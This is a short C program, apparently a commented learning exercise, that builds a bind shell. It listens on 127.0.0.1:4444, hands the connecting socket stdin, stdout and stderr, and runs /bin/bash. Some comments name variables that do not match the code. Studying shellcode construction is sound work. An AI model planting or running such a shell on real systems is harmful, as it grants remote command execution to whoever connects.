#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

int main() {
    //creating variable listen_sock which is returned by socket() as we need it for the bind(), listen(), and accept() calls 
    int serv_sock = socket(AF_INET, SOCK_STREAM, 0);

    // Building a 'struct' which consists of AF_INET, the interface we want to listen on (all), and a port number to bind on. This entire entity will be referenced in arguments for the next syscall: bind()    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;           
    server_addr.sin_addr.s_addr = inet_addr("127.0.0.1");  
    server_addr.sin_port = htons(4444);        

    // Our second syscall, and perhaps the most complicated: bind() 
    bind(serv_sock, (struct sockaddr *)&server_addr, sizeof(server_addr));

    //0 here is our specified backlog, (we dont have one)
    listen(serv_sock, 0);

    printf("[+] Socket is listening on 127.0.0.1:4444\n"); //Always put '\n' at the end of a stdout fd connected to a terminal in order to trigger the bufer. Other way the printf() function will not display anything. 


    //creating new var conn_sock which is returned from accept() and needed for the dup2() call which duplicates this for stdin, stdout, and stderr
    int sockfd = accept(serv_sock, NULL, NULL);

    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2); //Replace file stdin, stdout and stderr for current process

    execve("/bin/bash", NULL, NULL);

    return 0;
}